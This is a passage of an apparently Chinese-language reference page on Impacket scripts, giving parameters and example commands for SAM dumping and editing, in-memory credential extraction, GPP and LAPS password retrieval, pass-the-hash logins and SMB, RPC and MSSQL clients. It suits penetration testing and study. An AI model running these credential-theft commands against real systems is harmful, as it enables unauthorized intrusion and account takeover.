+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python samrdump.py target_ip</span><br><span class="line">python samrdump.py -csv domain/username:password@target_ip</span><br><span class="line">python samrdump.py -hashes <span class="number">00000000000000000000000000000000</span>:<span class="built_in">hash</span> domain/username@target_ip</span><br></pre></td></tr></table></figure>
+
+<h3 id="samedit-py"><a href="#samedit-py" class="headerlink" title="samedit.py"></a>samedit.py</h3><p><strong>功能</strong>: 编辑 SAM 数据库<br><strong>用途</strong>: 就地编辑 SAM hive 文件中本地用户的密码</p>
+<p><strong>参数说明</strong>:</p>
+<p><strong>位置参数</strong>:</p>
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>user</code></td>
+<td>要替换密码的用户账户名称</td>
+</tr>
+<tr>
+<td><code>sam</code></td>
+<td>要编辑的 SAM hive 文件</td>
+</tr>
+</tbody></table>
+<p><strong>选项参数</strong>:</p>
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>-password PASSWORD</code></td>
+<td>要设置的新密码</td>
+</tr>
+<tr>
+<td><code>-hashes HASHES</code></td>
+<td>直接替换 NTLM 哈希（LM 哈希可选）</td>
+</tr>
+<tr>
+<td><code>-system SYSTEM</code></td>
+<td>包含用于密码加密的 bootkey 的 SYSTEM hive 文件</td>
+</tr>
+<tr>
+<td><code>-bootkey BOOTKEY</code></td>
+<td>用于加密和解密 SAM 密码的 bootkey</td>
+</tr>
+<tr>
+<td><code>-debug</code></td>
+<td>开启调试输出</td>
+</tr>
+<tr>
+<td><code>-ts</code></td>
+<td>为每个日志输出添加时间戳</td>
+</tr>
+</tbody></table>
+<p><strong>示例</strong>:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">python samedit.py administrator SAM</span><br><span class="line">python samedit.py -password newpassword administrator SAM</span><br><span class="line">python samedit.py -hashes <span class="number">00000000000000000000000000000000</span>:新NTLM哈希 administrator SAM</span><br><span class="line">python samedit.py -system SYSTEM administrator SAM</span><br><span class="line">python samedit.py -bootkey bootkey_hex administrator SAM</span><br></pre></td></tr></table></figure>
+
+<h3 id="mimikatz-py"><a href="#mimikatz-py" class="headerlink" title="mimikatz.py"></a>mimikatz.py</h3><p><strong>功能</strong>: 模拟 mimikatz 功能提取凭证<br><strong>用途</strong>: 从内存中提取凭证信息</p>
+<p><strong>参数说明</strong>:</p>
+<p><strong>位置参数</strong>:</p>
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>target</code></td>
+<td>目标系统，格式为 <code>[[domain/]username[:password]@]&lt;targetName or address&gt;</code></td>
+</tr>
+</tbody></table>
+<p><strong>选项参数</strong>:</p>
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>-file FILE</code></td>
+<td>包含要在迷你 shell 中执行的命令的输入文件</td>
+</tr>
+<tr>
+<td><code>-debug</code></td>
+<td>开启调试输出</td>
+</tr>
+<tr>
+<td><code>-ts</code></td>
+<td>为每个日志输出添加时间戳</td>
+</tr>
+</tbody></table>
+<p><strong>认证参数</strong>:</p>
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>-hashes LMHASH:NTHASH</code></td>
+<td>NTLM 哈希值，格式为 LMHASH:NTHASH</td>
+</tr>
+<tr>
+<td><code>-no-pass</code></td>
+<td>不询问密码（对 -k 有用）</td>
+</tr>
+<tr>
+<td><code>-k</code></td>
+<td>使用 Kerberos 身份验证</td>
+</tr>
+<tr>
+<td><code>-aesKey hex key</code></td>
+<td>用于 Kerberos 身份验证的 AES 密钥（128 或 256 位）</td>
+</tr>
+</tbody></table>
+<p><strong>连接参数</strong>:</p>
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>-dc-ip ip address</code></td>
+<td>域控制器的 IP 地址</td>
+</tr>
+<tr>
+<td><code>-target-ip ip address</code></td>
+<td>目标机器的 IP 地址</td>
+</tr>
+</tbody></table>
+<p><strong>示例</strong>:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python mimikatz.py domain/username:password@target_ip</span><br><span class="line">python mimikatz.py -file commands.txt domain/username:password@target_ip</span><br><span class="line">python mimikatz.py -hashes <span class="number">00000000000000000000000000000000</span>:<span class="built_in">hash</span> domain/username@target_ip</span><br></pre></td></tr></table></figure>
+
+<h3 id="DumpNTLMInfo-py"><a href="#DumpNTLMInfo-py" class="headerlink" title="DumpNTLMInfo.py"></a>DumpNTLMInfo.py</h3><p><strong>功能</strong>: 转储 NTLM 信息<br><strong>用途</strong>: 执行 NTLM 身份验证并解析信息</p>
+<p><strong>参数说明</strong>:</p>
+<p><strong>位置参数</strong>:</p>
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>target</code></td>
+<td>目标名称或地址</td>
+</tr>
+</tbody></table>
+<p><strong>选项参数</strong>:</p>
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>-debug</code></td>
+<td>开启调试输出</td>
+</tr>
+<tr>
+<td><code>-ts</code></td>
+<td>为每个日志输出添加时间戳</td>
+</tr>
+<tr>
+<td><code>-target-ip ip address</code></td>
+<td>目标机器的 IP 地址。如果省略，将使用指定的目标。当目标是 NetBIOS 名称且无法解析时很有用</td>
+</tr>
+<tr>
+<td><code>-port destination port</code></td>
+<td>连接到 SMB&#x2F;RPC 服务器的目标端口</td>
+</tr>
+<tr>
+<td><code>-protocol [protocol]</code></td>
+<td>使用的协议（SMB 或 RPC）。默认为 SMB，端口 135 通常使用 RPC</td>
+</tr>
+</tbody></table>
+<p><strong>示例</strong>:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">python DumpNTLMInfo.py target_ip</span><br><span class="line">python DumpNTLMInfo.py -protocol RPC target_ip</span><br><span class="line">python DumpNTLMInfo.py -port <span class="number">135</span> target_ip</span><br><span class="line">python DumpNTLMInfo.py -target-ip <span class="number">192.168</span><span class="number">.1</span><span class="number">.100</span> target_name</span><br></pre></td></tr></table></figure>
+
+<h3 id="Get-GPPPassword-py"><a href="#Get-GPPPassword-py" class="headerlink" title="Get-GPPPassword.py"></a>Get-GPPPassword.py</h3><p><strong>功能</strong>: 获取组策略首选项密码<br><strong>用途</strong>: 组策略首选项密码查找器和解密器</p>
+<p><strong>参数说明</strong>:</p>
+<p><strong>位置参数</strong>:</p>
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>target</code></td>
+<td>目标系统，格式为 <code>[[domain/]username[:password]@]&lt;targetName or address&gt;</code> 或 LOCAL（如果要解析本地文件）</td>
+</tr>
+</tbody></table>
+<p><strong>选项参数</strong>:</p>
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>-share SHARE</code></td>
+<td>SMB 共享</td>
+</tr>
+<tr>
+<td><code>-base-dir BASE_DIR</code></td>
+<td>要搜索的目录（默认：&#x2F;）</td>
+</tr>
+<tr>
+<td><code>-ts</code></td>
+<td>为每个日志输出添加时间戳</td>
+</tr>
+<tr>
+<td><code>-debug</code></td>
+<td>开启调试输出</td>
+</tr>
+</tbody></table>
+<p><strong>认证参数</strong>:</p>
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>-hashes LMHASH:NTHASH</code></td>
+<td>NTLM 哈希值，格式为 LMHASH:NTHASH</td>
+</tr>
+<tr>
+<td><code>-no-pass</code></td>
+<td>不询问密码（对 -k 有用）</td>
+</tr>
+<tr>
+<td><code>-k</code></td>
+<td>使用 Kerberos 身份验证</td>
+</tr>
+<tr>
+<td><code>-aesKey hex key</code></td>
+<td>用于 Kerberos 身份验证的 AES 密钥（128 或 256 位）</td>
+</tr>
+</tbody></table>
+<p><strong>连接参数</strong>:</p>
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>-dc-ip ip address</code></td>
+<td>域控制器的 IP 地址</td>
+</tr>
+<tr>
+<td><code>-target-ip ip address</code></td>
+<td>目标机器的 IP 地址</td>
+</tr>
+<tr>
+<td><code>-port [destination port]</code></td>
+<td>连接到 SMB 服务器的目标端口</td>
+</tr>
+</tbody></table>
+<p><strong>示例</strong>:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python Get-GPPPassword.py domain/username:password@dc_ip</span><br><span class="line">python Get-GPPPassword.py -share SYSVOL domain/username:password@dc_ip</span><br><span class="line">python Get-GPPPassword.py LOCAL -base-<span class="built_in">dir</span> <span class="string">&quot;C:\Windows\SYSVOL&quot;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="GetLAPSPassword-py"><a href="#GetLAPSPassword-py" class="headerlink" title="GetLAPSPassword.py"></a>GetLAPSPassword.py</h3><p><strong>功能</strong>: 获取 LAPS 密码<br><strong>用途</strong>: 从 LDAP 提取 LAPS（本地管理员密码解决方案）密码</p>
+<p><strong>参数说明</strong>:</p>
+<p><strong>位置参数</strong>:</p>
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>target</code></td>
+<td>domain[&#x2F;username[:password]]</td>
+</tr>
+</tbody></table>
+<p><strong>选项参数</strong>:</p>
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>-computer computername</code></td>
+<td>按名称指定目标计算机</td>
+</tr>
+<tr>
+<td><code>-ts</code></td>
+<td>为每个日志输出添加时间戳</td>
+</tr>
+<tr>
+<td><code>-debug</code></td>
+<td>开启调试输出</td>
+</tr>
+<tr>
+<td><code>-outputfile OUTPUTFILE, -o OUTPUTFILE</code></td>
+<td>输出到文件</td>
+</tr>
+</tbody></table>
+<p><strong>认证参数</strong>:</p>
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>-hashes LMHASH:NTHASH</code></td>
+<td>NTLM 哈希值，格式为 LMHASH:NTHASH</td>
+</tr>
+<tr>
+<td><code>-no-pass</code></td>
+<td>不询问密码（对 -k 有用）</td>
+</tr>
+<tr>
+<td><code>-k</code></td>
+<td>使用 Kerberos 身份验证，从 ccache 文件（KRB5CCNAME）获取凭据</td>
+</tr>
+<tr>
+<td><code>-aesKey hex key</code></td>
+<td>用于 Kerberos 身份验证的 AES 密钥（128 或 256 位）</td>
+</tr>
+</tbody></table>
+<p><strong>连接参数</strong>:</p>
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>-dc-ip ip address</code></td>
+<td>域控制器的 IP 地址</td>
+</tr>
+<tr>
+<td><code>-dc-host hostname</code></td>
+<td>要使用的域控制器主机名</td>
+</tr>
+<tr>
+<td><code>-ldaps</code></td>
+<td>启用 LDAPS（基于 SSL 的 LDAP）。当查询强制 LDAPS 的 Windows Server 2025 域控制器时需要</td>
+</tr>
+</tbody></table>
+<p><strong>示例</strong>:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">python GetLAPSPassword.py domain/username:password@dc_ip</span><br><span class="line">python GetLAPSPassword.py -computer WORKSTATION01 domain/username:password@dc_ip</span><br><span class="line">python GetLAPSPassword.py -outputfile laps_passwords.txt domain/username:password@dc_ip</span><br><span class="line">python GetLAPSPassword.py -ldaps domain/username:password@dc_ip</span><br></pre></td></tr></table></figure>
+
+<h2 id="网络工具"><a href="#网络工具" class="headerlink" title="网络工具"></a>网络工具</h2><h3 id="smbclient-py"><a href="#smbclient-py" class="headerlink" title="smbclient.py"></a>smbclient.py</h3><p><strong>功能</strong>: SMB 客户端工具<br><strong>用途</strong>: 连接到远程 SMB 服务器，访问文件共享</p>
+<p><strong>参数说明</strong>:</p>
+<p><strong>位置参数</strong>:</p>
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>target</code></td>
+<td>目标系统，格式为 <code>[[domain/]username[:password]@]&lt;targetName or address&gt;</code></td>
+</tr>
+</tbody></table>
+<p><strong>选项参数</strong>:</p>
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>-outputfile OUTPUTFILE</code></td>
+<td>记录 smbclient 操作的输出文件</td>
+</tr>
+<tr>
+<td><code>-debug</code></td>
+<td>开启调试输出</td>
+</tr>
+<tr>
+<td><code>-ts</code></td>
+<td>为每个日志输出添加时间戳</td>
+</tr>
+</tbody></table>
+<p><strong>认证参数</strong>:</p>
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>-hashes LMHASH:NTHASH</code></td>
+<td>NTLM 哈希值，格式为 LMHASH:NTHASH</td>
+</tr>
+<tr>
+<td><code>-no-pass</code></td>
+<td>不询问密码（对 -k 有用）</td>
+</tr>
+<tr>
+<td><code>-k</code></td>
+<td>使用 Kerberos 身份验证</td>
+</tr>
+<tr>
+<td><code>-aesKey hex key</code></td>
+<td>用于 Kerberos 身份验证的 AES 密钥（128 或 256 位）</td>
+</tr>
+</tbody></table>
+<p><strong>连接参数</strong>:</p>
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>-dc-ip ip address</code></td>
+<td>域控制器的 IP 地址</td>
+</tr>
+<tr>
+<td><code>-target-ip ip address</code></td>
+<td>目标机器的 IP 地址</td>
+</tr>
+<tr>
+<td><code>-port [destination port]</code></td>
+<td>连接到 SMB 服务器的目标端口</td>
+</tr>
+</tbody></table>
+<p><strong>示例</strong>:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python smbclient.py domain/username:password@target_ip</span><br><span class="line">python smbclient.py -hashes <span class="number">00000000000000000000000000000000</span>:<span class="built_in">hash</span> domain/username@target_ip</span><br></pre></td></tr></table></figure>
+
+<h3 id="smbserver-py"><a href="#smbserver-py" class="headerlink" title="smbserver.py"></a>smbserver.py</h3><p><strong>功能</strong>: 搭建 SMB 服务器<br><strong>用途</strong>: 创建本地 SMB 服务器用于文件共享</p>
+<p><strong>参数说明</strong>:</p>
+<p><strong>位置参数</strong>:</p>
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>shareName</code></td>
+<td>要添加的共享名称</td>
+</tr>
+<tr>
+<td><code>sharePath</code></td>
+<td>要添加的共享路径</td>
+</tr>
+</tbody></table>
+<p><strong>选项参数</strong>:</p>
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>-comment COMMENT</code></td>
+<td>询问共享时显示的共享注释</td>
+</tr>
+<tr>
+<td><code>-username USERNAME</code></td>
+<td>用于验证客户端的用户名</td>
+</tr>
+<tr>
+<td><code>-password PASSWORD</code></td>
+<td>用户名的密码</td>
+</tr>
+<tr>
+<td><code>-hashes LMHASH:NTHASH</code></td>
+<td>用户名的 NTLM 哈希值，格式为 LMHASH:NTHASH</td>
+</tr>
+<tr>
+<td><code>-ts</code></td>
+<td>为每个日志输出添加时间戳</td>
+</tr>
+<tr>
+<td><code>-debug</code></td>
+<td>开启调试输出</td>
+</tr>
+<tr>
+<td><code>-ip INTERFACE_ADDRESS, --interface-address INTERFACE_ADDRESS</code></td>
+<td>监听接口的 IP 地址（省略时为 “0.0.0.0” 或 “::”）</td>
+</tr>
+<tr>
+<td><code>-port PORT</code></td>
+<td>监听传入连接的 TCP 端口（默认 445）</td>
+</tr>
+<tr>
+<td><code>-dropssp</code></td>
+<td>在协商期间禁用 NTLM ESS&#x2F;SSP</td>
+</tr>
+<tr>
+<td><code>-6, --ipv6</code></td>
+<td>监听 IPv6</td>
+</tr>
+<tr>
+<td><code>-smb2support</code></td>
+<td>SMB2 支持（实验性！）</td>
+</tr>
+<tr>
+<td><code>-outputfile OUTPUTFILE</code></td>
+<td>记录 smbserver 输出消息的输出文件</td>
+</tr>
+</tbody></table>
+<p><strong>示例</strong>:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python smbserver.py TMP C:\temp</span><br><span class="line">python smbserver.py -username test -password test123 SHARE C:\share</span><br><span class="line">python smbserver.py -comment <span class="string">&quot;My Share&quot;</span> -port <span class="number">4455</span> SHARE C:\path</span><br></pre></td></tr></table></figure>
+
+<h3 id="rpcdump-py"><a href="#rpcdump-py" class="headerlink" title="rpcdump.py"></a>rpcdump.py</h3><p><strong>功能</strong>: RPC 接口转储工具<br><strong>用途</strong>: 通过 epmapper 转储远程 RPC 端点信息</p>
+<p><strong>参数说明</strong>:</p>
+<p><strong>位置参数</strong>:</p>
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>target</code></td>
+<td>目标系统，格式为 <code>[[domain/]username[:password]@]&lt;targetName or address&gt;</code></td>
+</tr>
+</tbody></table>
+<p><strong>选项参数</strong>:</p>
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>-debug</code></td>
+<td>开启调试输出</td>
+</tr>
+<tr>
+<td><code>-ts</code></td>
+<td>为每个日志输出添加时间戳</td>
+</tr>
+</tbody></table>
+<p><strong>连接参数</strong>:</p>
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>-target-ip ip address</code></td>
+<td>目标机器的 IP 地址</td>
+</tr>
+<tr>
+<td><code>-port [destination port]</code></td>
+<td>连接到 RPC Endpoint Mapper 的目标端口</td>
+</tr>
+</tbody></table>
+<p><strong>认证参数</strong>:</p>
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>-hashes LMHASH:NTHASH</code></td>
+<td>NTLM 哈希值，格式为 LMHASH:NTHASH</td>
+</tr>
+</tbody></table>
+<p><strong>示例</strong>:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python rpcdump.py target_ip</span><br><span class="line">python rpcdump.py -target-ip <span class="number">192.168</span><span class="number">.1</span><span class="number">.100</span> domain/username:password@target_name</span><br><span class="line">python rpcdump.py -port <span class="number">135</span> target_ip</span><br></pre></td></tr></table></figure>
+
+<h3 id="rpcmap-py"><a href="#rpcmap-py" class="headerlink" title="rpcmap.py"></a>rpcmap.py</h3><p><strong>功能</strong>: RPC 接口映射工具<br><strong>用途</strong>: 映射目标系统上的 RPC 服务<br><strong>示例</strong>:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python rpcmap.py target_ip</span><br></pre></td></tr></table></figure>
+
+<h3 id="CheckLDAPStatus-py"><a href="#CheckLDAPStatus-py" class="headerlink" title="CheckLDAPStatus.py"></a>CheckLDAPStatus.py</h3><p><strong>功能</strong>: 检查 LDAP 服务器状态<br><strong>用途</strong>: LDAP 签名和通道绑定枚举工具</p>
+<p><strong>参数说明</strong>:</p>
+<p><strong>选项参数</strong>:</p>
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>-dc-ip ip address</code></td>
+<td>域控制器的 IP 地址或域的 DNS 解析器</td>
+</tr>
+<tr>
+<td><code>-domain DOMAIN</code></td>
+<td>域名</td>
+</tr>
+<tr>
+<td><code>-debug</code></td>
+<td>开启调试输出</td>
+</tr>
+<tr>
+<td><code>-timeout TIMEOUT</code></td>
+<td>DNS 超时时间</td>
+</tr>
+<tr>
+<td><code>-ts</code></td>
+<td>为每个日志输出添加时间戳</td>
+</tr>
+</tbody></table>
+<p><strong>示例</strong>:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python CheckLDAPStatus.py -dc-ip <span class="number">192.168</span><span class="number">.1</span><span class="number">.100</span> -domain example.com</span><br><span class="line">python CheckLDAPStatus.py -dc-ip dc.example.com -domain example.com -debug</span><br></pre></td></tr></table></figure>
+
+<h3 id="mssqlclient-py"><a href="#mssqlclient-py" class="headerlink" title="mssqlclient.py"></a>mssqlclient.py</h3><p><strong>功能</strong>: MSSQL 数据库客户端<br><strong>用途</strong>: TDS 客户端实现（支持 SSL）</p>
+<p><strong>参数说明</strong>:</p>
+<p><strong>位置参数</strong>:</p>
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>target</code></td>
+<td>目标系统，格式为 <code>[[domain/]username[:password]@]&lt;targetName or address&gt;</code></td>
+</tr>
+</tbody></table>
+<p><strong>选项参数</strong>:</p>
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>-db DB</code></td>
+<td>MSSQL 数据库实例（默认 None）</td>
+</tr>
+<tr>
+<td><code>-windows-auth</code></td>
+<td>是否使用 Windows 身份验证（默认 False）</td>
+</tr>
+<tr>
+<td><code>-debug</code></td>
+<td>开启调试输出</td>
+</tr>
+<tr>
+<td><code>-show</code></td>
+<td>显示查询</td>
+</tr>
+<tr>
+<td><code>-command [COMMAND ...]</code></td>
+<td>要在 SQL shell 中执行的命令，可以传递多个命令</td>
+</tr>
+<tr>
+<td><code>-file FILE</code></td>
+<td>包含要在 SQL shell 中执行的命令的输入文件</td>
+</tr>
+</tbody></table>
+<p><strong>认证参数</strong>:</p>
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>-hashes LMHASH:NTHASH</code></td>
+<td>NTLM 哈希值，格式为 LMHASH:NTHASH</td>
+</tr>
+<tr>
+<td><code>-no-pass</code></td>
+<td>不询问密码（对 -k 有用）</td>
+</tr>
+<tr>
+<td><code>-k</code></td>
+<td>使用 Kerberos 身份验证</td>
+</tr>
+<tr>
+<td><code>-aesKey hex key</code></td>
+<td>用于 Kerberos 身份验证的 AES 密钥（128 或 256 位）</td>
+</tr>
+</tbody></table>
+<p><strong>连接参数</strong>:</p>
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>-dc-ip ip address</code></td>
+<td>域控制器的 IP 地址</td>
+</tr>
+<tr>
+<td><code>-target-ip ip address</code></td>
+<td>目标机器的 IP 地址</td>
+</tr>
+<tr>
+<td><code>-port PORT</code></td>
+<td>目标 MSSQL 端口（默认 1433）</td>
+</tr>
+</tbody></table>
+<p><strong>示例</strong>:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">python mssqlclient.py domain/username:password@target_ip</span><br><span class="line">python mssqlclient.py -windows-auth domain/username:password@target_ip</span><br><span class="line">python mssqlclient.py -db master -command <span class="string">&quot;SELECT * FROM sys.databases&quot;</span> domain/username:password@target_ip</span><br><span class="line">python mssqlclient.py -file queries.sql domain/username:password@target_ip</span><br></pre></td></tr></table></figure>
+
+<h3 id="mssqlinstance-py"><a href="#mssqlinstance-py" class="headerlink" title="mssqlinstance.py"></a>mssqlinstance.py</h3><p><strong>功能</strong>: 查询 MSSQL 实例<br><strong>用途</strong>: 查询远程主机上运行的 MSSQL 实例</p>
+<p><strong>参数说明</strong>:</p>
+<p><strong>位置参数</strong>:</p>
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>host</code></td>
+<td>目标主机</td>
+</tr>
+</tbody></table>
+<p><strong>选项参数</strong>:</p>
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>-timeout TIMEOUT</code></td>
+<td>等待答案的超时时间</td>
+</tr>
+<tr>
+<td><code>-debug</code></td>
+<td>开启调试输出</td>
+</tr>
+<tr>
+<td><code>-ts</code></td>
+<td>为每个日志输出添加时间戳</td>
+</tr>
+</tbody></table>
+<p><strong>示例</strong>:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python mssqlinstance.py target_ip</span><br><span class="line">python mssqlinstance.py -timeout <span class="number">10</span> target_ip</span><br><span class="line">python mssqlinstance.py -debug target_ip</span><br></pre></td></tr></table></figure>
+
+<h3 id="rdp-check-py"><a href="#rdp-check-py" class="headerlink" title="rdp_check.py"></a>rdp_check.py</h3><p><strong>功能</strong>: RDP 账户验证<br><strong>用途</strong>: 使用 RDP 协议测试账户在目标主机上是否有效</p>
+<p><strong>参数说明</strong>:</p>
+<p><strong>位置参数</strong>:</p>
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>target</code></td>
+<td>[[domain&#x2F;]username[:password]@]<targetName or address></td>
+</tr>
+</tbody></table>
+<p><strong>选项参数</strong>:</p>
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>-6, --ipv6</code></td>
+<td>在 IPv6 上测试</td>
+</tr>
+<tr>
+<td><code>-ts</code></td>
+<td>为每个日志输出添加时间戳</td>
+</tr>
+<tr>
+<td><code>-debug</code></td>
+<td>开启调试输出</td>
+</tr>
+</tbody></table>
+<p><strong>认证参数</strong>:</p>
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>-hashes LMHASH:NTHASH</code></td>
+<td>NTLM 哈希值，格式为 LMHASH:NTHASH</td>
+</tr>
+</tbody></table>
+<p><strong>示例</strong>:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python rdp_check.py domain/username:password@target_ip</span><br><span class="line">python rdp_check.py -<span class="number">6</span> domain/username:password@target_ip</span><br><span class="line">python rdp_check.py -hashes <span class="number">00000000000000000000000000000000</span>:ntlm_hash domain/username@target_ip</span><br></pre></td></tr></table></figure>
+
+<h2 id="系统管理工具"><a href="#系统管理工具" class="headerlink" title="系统管理工具"></a>系统管理工具</h2><h3 id="services-py"><a href="#services-py" class="headerlink" title="services.py"></a>services.py</h3><p><strong>功能</strong>: 管理远程服务<br><strong>用途</strong>: Windows 服务操作脚本</p>
+<p><strong>参数说明</strong>:</p>
+<p><strong>位置参数</strong>:</p>
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>target</code></td>
+<td>目标系统，格式为 <code>[[domain/]username[:password]@]&lt;targetName or address&gt;</code></td>
+</tr>
+<tr>
+<td><code>start</code></td>
+<td>启动服务</td>
+</tr>
+<tr>
+<td><code>stop</code></td>
+<td>停止服务</td>
+</tr>
+<tr>
+<td><code>delete</code></td>
+<td>删除服务</td>
+</tr>
+<tr>
+<td><code>status</code></td>
+<td>返回服务状态</td>
+</tr>
+<tr>
+<td><code>config</code></td>
+<td>返回服务配置</td>
+</tr>
+<tr>
+<td><code>list</code></td>
+<td>列出可用服务</td>
+</tr>
+<tr>
+<td><code>create</code></td>
+<td>创建服务</td>
+</tr>
+<tr>
+<td><code>change</code></td>
+<td>更改服务配置</td>
+</tr>
+</tbody></table>
+<p><strong>选项参数</strong>:</p>
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>-debug</code></td>
+<td>开启调试输出</td>
+</tr>
+<tr>
+<td><code>-ts</code></td>
+<td>为每个日志输出添加时间戳</td>
+</tr>
+</tbody></table>
+<p><strong>认证参数</strong>:</p>
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>-hashes LMHASH:NTHASH</code></td>
